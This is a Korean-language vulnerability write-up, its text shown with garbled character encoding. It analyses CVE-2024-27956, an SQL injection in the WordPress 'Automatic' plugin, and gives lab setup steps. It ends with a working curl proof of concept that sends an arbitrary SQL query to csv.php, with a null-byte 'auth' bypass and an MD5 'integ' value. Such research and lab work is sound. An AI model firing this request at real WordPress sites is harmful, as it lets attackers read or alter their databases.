# CVE-2024-27956

## Index
* [ğŸ“ Analysis](#-analysis)
    * [1. ê°œìš”](#1-ê°œìš”)
    * [2. ë°œìƒ ì›ì¸](#2-ë°œìƒ-ì›ì¸)
    * [3. íŒ¨ì¹˜ í™•ì¸](#3-íŒ¨ì¹˜-í™•ì¸)
* [ğŸ”« PoC](#-PoC)
    * [1. í™˜ê²½ ì…‹íŒ…(Automatic 3.92.0 ì„¤ì¹˜)](#1-í™˜ê²½-ì…‹íŒ…automatic-3920-ì„¤ì¹˜)
    * [2. ìµìŠ¤í”Œë¡œì‡](#2-ìµìŠ¤í”Œë¡œì‡)


## ğŸ“ Analysis

### 1. ê°œìš”

`CVE-2024-27956` ì€ WordPressì˜ `Automatic` í”ŒëŸ¬ê·¸ì¸ì—ì„œ ë°œê²¬ëœ SQL Injection ì·¨ì•½ì ìœ¼ë¡œ, ë²„ì „ 3.92.0 ì´í•˜ì—ì„œ ì˜í–¥ì„ ë°›ìŠµë‹ˆë‹¤.

`Automatic` í”ŒëŸ¬ê·¸ì¸ì€ ChatGPT, ìœ íŠœë¸Œ, ì•„ë§ˆì¡´, íŠ¸ìœ„í„°, í˜ì´ìŠ¤ë¶ ë“± ì—¬ëŸ¬ í”Œë«í¼ê³¼ í†µí•©ë˜ì–´, í•´ë‹¹ í”Œë«í¼ì˜ ì½˜í…ì¸ ë¥¼ ìë™ìœ¼ë¡œ ìˆ˜ì§‘í•˜ê³  ê²Œì‹œí•  ìˆ˜ ìˆëŠ” í”ŒëŸ¬ê·¸ì¸ì…ë‹ˆë‹¤. 

ì˜ˆë¥¼ ë“¤ì–´, ChatGPTë¥¼ ì´ìš©í•œ í¬ìŠ¤íŒ… ìë™í™”ë¥¼ ë‹¤ìŒê³¼ ê°™ì´ ë“±ë¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![image-001](images/image-001.png)

### 2. ë°œìƒ ì›ì¸

WordPressì˜ `Automatic` í”ŒëŸ¬ê·¸ì¸ì„ ì´ìš©í•˜ì—¬ ì½˜í…ì¸ ë¥¼ ìˆ˜ì§‘í•˜ê±°ë‚˜ ê²Œì‹œí•˜ëŠ” ê¸°ëŠ¥ì„ ì´ìš©í•  ê²½ìš° ë¡œê·¸ ê¸°ë¡ì´ ë‹¤ìŒê³¼ ê°™ì´ ë¡œê·¸ í˜ì´ì§€(`/wp-admin/edit.php?post_type=wp_automatic&page=gm_log`) ìŒ“ì´ê²Œ ë©ë‹ˆë‹¤. 

![image-002](images/image-002.png)

ë˜í•œ, `Automatic` ë²„ì „ 3.92.0 ì´í•˜ì—ì„œëŠ” ë¡œê·¸ í˜ì´ì§€ í•˜ë‹¨ì— ì¡´ì¬í•˜ëŠ” ë²„íŠ¼(`Download CSV Report for shown results`)ì„ í´ë¦­í•˜ì—¬ ë¡œê·¸ ê¸°ë¡ì„ CSV íŒŒì¼ë¡œ ë°›ì•„ì˜¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![image-003](images/image-003.png)

í•´ë‹¹ ë²„íŠ¼ì˜ HTML ìš”ì†Œë¥¼ ì‚´í´ë³´ë©´ ì•„ë˜ì™€ ê°™ì´ ì •ì˜ë˜ì–´ ìˆìŠµë‹ˆë‹¤.

![image-004](images/image-004.png)

ì¦‰, í¼ íƒœê·¸ë¥¼ ì´ìš©í•˜ì—¬ URL `/wp-content/plugins/wp-automatic/inc/csv.php` ë¡œ POST ìš”ì²­ì„ ìˆ˜í–‰í•˜ë©°, ìš”ì²­ ì‹œ ì•„ë˜ì˜ í˜ì´ë¡œë“œë¥¼ í•¨ê»˜ ìš”ì²­í•˜ê³  ìˆìŠµë‹ˆë‹¤.

| name | value |
| :---: | :--- |
| `q` | `SELECT * FROM wp_automatic_log  ORDER BY id DESC  limit 100`  |
| `auth` | `$P$BdQ8h4D6PqpeGNA8xBFBeeVyqq3BQY/` |
| `integ` | `9de25adaed040a56ea97546e9352356a` |

ì´ë•Œ, ìš”ì²­ URL `/wp-content/plugins/wp-automatic/inc/csv.php` ì— ì •ì˜ëœ ì½”ë“œë¥¼ ì‚´í´ë³´ë©´, í˜ì´ë¡œë“œ `q`ë¡œ ì „ë‹¬ë˜ëŠ” SQL ì§ˆì˜ë¬¸ì´ ì–´ë– í•œ í•„í„°ë§ë„ ê±°ì¹˜ì§€ ì•Šê³  ë°ì´í„°ë² ì´ìŠ¤ì— ì§ì ‘ ì§ˆì˜ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![image-005](images/image-005.png)

ë”°ë¼ì„œ, ë¡œê·¸ ê¸°ë¡ì„ CSV íŒŒì¼ë¡œ ì €ì¥í•  ë•Œ ì‚¬ìš©ì(í´ë¼ì´ì–¸íŠ¸)ë¡œë¶€í„° SQL ì§ˆì˜ë¬¸ì„ ì§ì ‘ ë°›ì•„ ì²˜ë¦¬í•˜ê³  ìˆìŠµë‹ˆë‹¤. ì´ ê³¼ì •ì—ì„œ í•´ë‹¹ SQL ì§ˆì˜ë¬¸ì— ëŒ€í•œ ì–´ë– í•œ í•„í„°ë§ë„ ìˆ˜í–‰ë˜ì§€ ì•Šì•„ SQL Injection ì·¨ì•½ì ì´ ë°œìƒí•˜ê²Œ ë©ë‹ˆë‹¤.

### 3. íŒ¨ì¹˜ í™•ì¸

`Automatic` í”ŒëŸ¬ê·¸ì¸ì€ ìœ ë£Œ í”ŒëŸ¬ê·¸ì¸ì´ë¼ íŒ¨ì¹˜ëœ ë²„ì „(3.92.1 ì´í›„)ì— ëŒ€í•œ ì½”ë“œ ë³€ê²½ ì´ë ¥ì„ í™•ì¸í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤.

ë‹¤ë§Œ, ì¸í„°ë„·ìƒì— ê³µê°œëœ ë²„ì „(3.106.0)ì„ í™•ì¸í•œ ê²°ê³¼, ë¡œê·¸ í˜ì´ì§€ì—ì„œ ë¡œê·¸ ê¸°ë¡ì„ CSV íŒŒì¼ë¡œ ì €ì¥í•˜ëŠ” ë²„íŠ¼ì´ ì œê±°ëœ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.

![image-006](images/image-006.png)

![image-007](images/image-007.png)

ë˜í•œ, SQL Injection ì·¨ì•½ì ì´ ë°œìƒí•œ URL ê²½ë¡œ `/wp-content/plugins/wp-automatic/inc/csv.php`ì˜ í•´ë‹¹ íŒŒì¼ì´ ì‚­ì œëœ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.

## ğŸ”« PoC

### 1. í™˜ê²½ ì…‹íŒ…(Automatic 3.92.0 ì„¤ì¹˜)

`CVE-2024-27956` ì˜ PoC í™˜ê²½ êµ¬ì„±ì„ ìœ„í•´ ì•„ë˜ì˜ ëª…ë ¹ì„ ì…ë ¥í•©ë‹ˆë‹¤.

```bash
# ì €ì¥ì†Œ í´ë¡ 
$ git clone -b CVE-2024-27956 https://github.com/DoTTak/Research-WordPress.git CVE-2024-27956
```

ì´í›„ WordPress ê´€ë¦¬ í˜ì´ì§€ì˜ í”ŒëŸ¬ê·¸ì¸ ì¶”ê°€ í˜ì´ì§€(`/wp-admin/plugin-install.php`)ë¡œ ì´ë™í•©ë‹ˆë‹¤.

![image-008](images/image-008.png)

ê·¸ ë‹¤ìŒ `íŒŒì¼ ì„ íƒ` ë²„íŠ¼ì„ í´ë¦­í•˜ì—¬ ì¡°ê¸ˆ ì „ ë‚´ë ¤ë°›ì€ ì €ì¥ì†Œì— ì¡´ì¬í•˜ëŠ” ì••ì¶• íŒŒì¼(`CVE-2024-27956/plugins/WP-Automatic-3.92.0.zip`)ì„ ì—…ë¡œë“œí•©ë‹ˆë‹¤.

![image-009](images/image-009.png)

ì—…ë¡œë“œê°€ ì™„ë£Œë˜ë©´ `ì§€ê¸ˆ ì„¤ì¹˜` ë²„íŠ¼ì„ í´ë¦­í•˜ì—¬ í”ŒëŸ¬ê·¸ì¸ì„ ì„¤ì¹˜í•©ë‹ˆë‹¤. ì„¤ì¹˜ê°€ ì™„ë£Œëœ í›„ 'í”ŒëŸ¬ê·¸ì¸ í™œì„±í™”' ë²„íŠ¼ì„ í´ë¦­í•˜ì—¬ `Automatic` í”ŒëŸ¬ê·¸ì¸ì„ í™œì„±í™”í•©ë‹ˆë‹¤.

![image-010](images/image-010.png)

![image-011](images/image-011.png)

í”ŒëŸ¬ê·¸ì¸ì´ ì •ìƒì ìœ¼ë¡œ ì„¤ì¹˜ ì™„ë£Œ ëìœ¼ë©´ ì•„ë˜ì™€ ê°™ì´ ì¢Œì¸¡ ì‚¬ì´ë“œ ë©”ë‰´ì— `Automatic` í”ŒëŸ¬ê·¸ì¸ ë©”ë‰´ê°€ ë“±ì¥í•©ë‹ˆë‹¤.

![image-012](images/image-012.png)

### 2. ìµìŠ¤í”Œë¡œì‡

ìœ„ ê³¼ì •ì„ í†µí•´ `Automatic` í”ŒëŸ¬ê·¸ì¸ ì„¤ì¹˜ë¥¼ ì™„ë£Œí•˜ê³  í™œì„±í™” í•œ ë’¤, ì•„ë˜ì˜ ëª…ë ¹ì–´ë¥¼ ì…ë ¥í•©ë‹ˆë‹¤.

> `WordPress URL ì£¼ì†Œ` ë€ì— ìì‹ ì˜ WordPress ì£¼ì†Œë¥¼ ì…ë ¥í•©ë‹ˆë‹¤.
> 

```bash
curl -X POST <WordPress URL ì£¼ì†Œ>/wp-content/plugins/wp-automatic/inc/csv.php \
  -d "q=SELECT 'CVE-2024-27956 Exploit' as action, @@VERSION as data, '2024-11-5 04:49:51' as date" \
  -d "auth=%00" \
  -d "integ=c66b4ac73975004d6b788d1ae833ea1e" # integì˜ ê°’ì€ që¥¼ md5 í•´ì‹œí•œ ê°’
```

ìœ„ ëª…ë ¹ì–´ì—ì„œ í˜ì´ë¡œë“œ `q` ì— ì…ë ¥ëœ SQL ì§ˆì˜ë¬¸ì€ ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.

![image-013](images/image-013.png)

ë”°ë¼ì„œ, ìœ„ ëª…ë ¹ì–´ë¥¼ ì…ë ¥í•  ê²½ìš° ìµœì¢…ì ìœ¼ë¡œ ì•„ë˜ì™€ ê°™ì´ SQL Injection ì·¨ì•½ì ì´ ë°œìƒë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![image-014](images/image-014.png)